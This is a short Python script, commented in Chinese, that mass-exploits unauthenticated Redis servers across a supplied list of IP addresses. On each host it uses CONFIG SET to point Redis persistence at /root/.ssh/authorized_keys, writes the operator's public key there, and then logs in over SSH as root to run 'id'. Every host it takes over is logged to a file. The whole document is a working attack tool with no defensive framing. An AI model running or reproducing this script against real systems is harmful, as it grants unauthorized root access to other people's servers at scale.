# coding:utf-8
# 多线程验证redis是否可传公钥
# author:ske
# python3 _redis_shell_multi.py ip.txt 5

import redis
import threading
from queue import Queue
import sys
import paramiko

event = threading.Event()
event.set()
q = Queue(-1)

rsa_pub = '/root/.ssh/id_rsa.pub'   # 公钥路径
pkey = '/root/.ssh/id_rsa'          # 密钥路径

# 获取公钥内容
def get_id_rsa_pub():
    with open(rsa_pub, 'rt') as f:
        id_rsa_pub = '\n\n\n{}\n\n'.format(f.read())
    return id_rsa_pub

class multi_thread(threading.Thread):
    def __init__(self,num,q):
        threading.Thread.__init__(self)
        self.num = num
        self.q = q

    def run(self):
        while event.is_set():                                               #is_set()查看信号，由于之前设置了Flag为True，所以为真
            if self.q.empty():                                              #如果队列空了就跳出循环，终止
                event.clear()
            else:                                                           #如果队列不为空
                ip = self.q.get()
                self.shell_redis(ip)

    def shell_redis(self, ip):
        try:
            r = redis.Redis(host=ip, port=6379, socket_timeout=5)
            r.config_set('dir', '/root/.ssh/')
            #print('[ok] -> [{}] : config set dir /root/.ssh/'.format(ip))
            r.config_set('dbfilename', 'authorized_keys')
            #print('[ok] -> [{}]  : config set dbfilename "authorized_keys"'.format(ip))
            id_rsa_pub = get_id_rsa_pub()
            r.set('crackit', id_rsa_pub)
            #print('[ok] -> [{}]  : set crackit'.format(ip))
            r.save()
            #print('[ok] -> [{}]  : save'.format(ip))
            key = paramiko.RSAKey.from_private_key_file(pkey)
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, port=22, username="root", pkey=key, timeout=5)
            ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command('id')
            content = ssh_stdout.readlines()
            if content:
                print("[ok] -> [{}] : {}".format(ip, content[0]))
            self.save(ip)
        except Exception as e:
            error = e.args
            if error == ('',):
                error = 'save error'
            print('[-] [{}] : {}'.format(error, ip))

    def save(self, ip):
        with open('ok.txt', 'at') as f:
            f.writelines(ip + '\n')

def scan_thread():                                                         #参数是队列
    threads = []
    for num in range(1,thread_num+1):
        t = multi_thread(num,q)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

def get_ip():
    with open(path, 'rt') as f:
        for ip in f.readlines():
            q.put(ip.strip())

if __name__ == '__main__':
    path = sys.argv[1]  # /root/unAuth/redis/success.txt
    thread_num = int(sys.argv[2])
    get_ip()
    scan_thread()